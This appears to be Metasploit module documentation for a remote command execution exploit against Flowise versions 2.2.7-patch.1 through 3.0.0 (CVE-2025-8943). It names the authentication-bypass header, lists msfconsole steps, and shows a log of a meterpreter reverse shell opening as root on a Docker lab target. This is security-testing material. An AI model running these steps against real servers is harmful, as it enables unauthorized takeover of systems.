## Vulnerable Application

[Flowise](https://github.com/FlowiseAI/Flowise) is an open-source platform for building AI agents. Versions >= 2.2.7-patch.1 and < 3.0.1 are vulnerable to a remote command execution vulnerability (CVE-2025-8943) in the customMCP endpoint.

The vulnerability exists in the `/api/v1/node-load-method/customMCP` endpoint which allows users to execute arbitrary commands by sending a specially crafted JSON payload. The endpoint accepts a command and arguments that are executed directly on the system
via StdioClientTransport. When FLOWISE_USERNAME and FLOWISE_PASSWORD environment variables are not configured, the exploit works unauthenticated
by using the 'x-request-from: internal' header. If Basic Auth is enabled, the module supports providing credentials via the FLOWISE_USERNAME
and FLOWISE_PASSWORD options.

This vulnerability affects Flowise versions >= 2.2.7-patch.1 (introduced March 14, 2025) and < 3.0.1 (fixed May 29, 2025).

This module was successfully tested on:

    * Flowise 3.0.0 installed with Docker

### Installation

1. `git clone https://github.com/FlowiseAI/Flowise.git`

2. `cd Flowise`

3. `git checkout flowise@3.0.0`

4. `cd docker`

5. `cp .env.example .env`

6. Edit `docker-compose.yml` and set the image to `flowiseai/flowise:3.0.0`:

```yaml
services:
  flowise:
    image: flowiseai/flowise:3.0.0
```

7. `docker compose up -d`

8. Verify the installation by checking http://127.0.0.1:3000/api/v1/version (should return `{"version":"3.0.0"}`)


## Verification Steps

1. Install the application
2. Start msfconsole
3. Do: `use exploit/multi/http/flowise_custommcp_rce_cve_2025_8943`
4. Do: `set RHOSTS <target_ip>`
5. Do: `set LHOST <your_ip>`
6. Do: `set FETCH_SRVHOST <your_ip>`
7. Do: `run`
8. You should get a meterpreter session


## Options

**FLOWISE_USERNAME** (optional): Flowise username for Basic Auth. Required if the target has FLOWISE_USERNAME environment variable configured.

**FLOWISE_PASSWORD** (optional): Flowise password for Basic Auth. Required if the target has FLOWISE_PASSWORD environment variable configured.

**Note**: The module automatically handles authentication. If Basic Auth is not configured on the target, the exploit works unauthenticated.
If Basic Auth is enabled, you must provide credentials using the FLOWISE_USERNAME and FLOWISE_PASSWORD options. The module includes
improved error handling with HTTP response code validation (200 = success, 401 = authentication required, 404 = endpoint not found, etc.)


## Scenarios

### Flowise 3.0.0 on Linux (Docker)

```
msf6 > use exploit/multi/http/flowise_custommcp_rce_cve_2025_8943
[*] No payload configured, defaulting to cmd/linux/http/aarch64/meterpreter/reverse_tcp
msf6 exploit(multi/http/flowise_custommcp_rce_cve_2025_8943) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 exploit(multi/http/flowise_custommcp_rce_cve_2025_8943) > set RPORT 3000
RPORT => 3000
msf6 exploit(multi/http/flowise_custommcp_rce_cve_2025_8943) > set PAYLOAD cmd/linux/http/x64/meterpreter_reverse_tcp
PAYLOAD => cmd/linux/http/x64/meterpreter_reverse_tcp
msf6 exploit(multi/http/flowise_custommcp_rce_cve_2025_8943) > set LHOST 172.17.0.1
LHOST => 172.17.0.1
msf6 exploit(multi/http/flowise_custommcp_rce_cve_2025_8943) > set LPORT 5555
LPORT => 5555
msf6 exploit(multi/http/flowise_custommcp_rce_cve_2025_8943) > set FETCH_SRVHOST 172.17.0.1
FETCH_SRVHOST => 172.17.0.1
msf6 exploit(multi/http/flowise_custommcp_rce_cve_2025_8943) > set FETCH_SRVPORT 8081
FETCH_SRVPORT => 8081
msf6 exploit(multi/http/flowise_custommcp_rce_cve_2025_8943) > run

[*] Started reverse TCP handler on 172.17.0.1:5555 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Flowise version detected: 3.0.0
[+] The target appears to be vulnerable. Version 3.0.0 is vulnerable to CVE-2025-8943
[*] Sending stage (3090404 bytes) to 172.23.0.2
[*] Meterpreter session 1 opened (172.17.0.1:5555 -> 172.23.0.2:36184) at 2025-11-18 21:45:37 +0100

meterpreter > sysinfo
Computer        : docker-flowise-1
OS              : Linux
Architecture    : x64
System Language : en_US.UTF-8
Meterpreter     : x64/linux
meterpreter > getuid
Server username: root
```

